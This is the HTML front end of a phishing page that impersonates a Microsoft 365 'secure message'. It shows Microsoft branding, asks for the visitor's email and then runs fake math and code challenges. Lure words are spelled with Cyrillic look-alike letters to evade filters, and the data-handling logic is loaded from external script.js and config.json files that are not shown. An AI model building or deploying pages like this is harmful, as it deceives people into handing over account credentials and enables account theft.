<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Message</title>
  <style>
        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg');
            background-size: cover;
            background-position: center;
        }
    .container {
      background-color: white;
            border: 1px solid #ccc;
            border-radius: 3px;
            padding: 33px;
            width: 80%;
            max-width: 300px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            margin-top: 0px;
    }
    .header {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
      margin-bottom: 20px;
    }
    .header img {
      width: 32.5px; /* Adjust as needed */
    }
    .header span {
      font-size: 20px;
      font-weight: bold;
      color: #555;
    }
    h2 {
      font-size: 18px;
      color: #333;
      margin-bottom: 20px;
    }
    p {
      font-size: 16px;
      color: #555;
      margin-bottom: 15px;
    }
	    p2 {
      display: block;
            margin-bottom: 10px;
            color: #666;
            font-size: 13px;
            margin-bottom: 20px;
    }
    input[type="email"],
    input[type="text"],
    input[type="number"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
            box-sizing: border-box;
            text-align: center;
    }
    button {
			width: 100%;
            padding: 10px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            cursor: pointer;
    }
    button:hover {
      background-color: #005bb5;
    }
    .message {
      margin-top: 20px;
      font-size: 12px;
      color: #555;
      display: none;
    }
    .fade-in {
      display: block;
      animation: fadeIn 0.5s ease-in;
    }
    @keyframes fadeIn {
      from {opacity: 0;}
      to {opacity: 1;}
    }
    .hidden {
      display: none !important;
    }
    .error {
      color: red;
      margin-top: 5px;
      display: none;
    }
  </style>
      
  
</head>
<body>
  <div class="container">
    <div class="header">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft 365" />
      <span>Microsoft</span>
    </div>

    <div id="step1">
      <p><strong>You've received a ѕесսrе message:</strong></p>
      <p class="description">To ассеѕѕ this ѕесսrе message, we'll need to vеrіfy the intended recipient's еmаіl.</p>
      <input type="email" id="email" placeholder="Enter your email" required />
      <button onclick="checkEmailDomain()">Continue</button>
      <p id="domainError" class="error"></p>
    </div>

    <div id="step2" class="message">
      <p>Checking your email address...</p>
    </div>

    <div id="step3" class="message">
      <p>Please solve this math problem:</p>
      <p id="mathQuestion"></p>
      <input type="number" id="mathAnswer" placeholder="Enter answer" />
      <button onclick="checkMathAnswer()">Submit</button>
      <p id="mathError" class="error"></p>
    </div>

    <div id="step4" class="message">
      <p>Enter the 5-character code:</p>
      <p id="charChallenge"></p>
      <input type="text" id="charAnswer" maxlength="10" />
      <button onclick="checkCharAnswer()">Submit</button>
      <p id="charError" class="error"></p>
    </div>

    <div id="step5" class="message">
      <p>Granting access...</p>
    </div>
  </div>

  <script src="script.js"></script>
  <script src="config.json"></script>
</body>
</html>
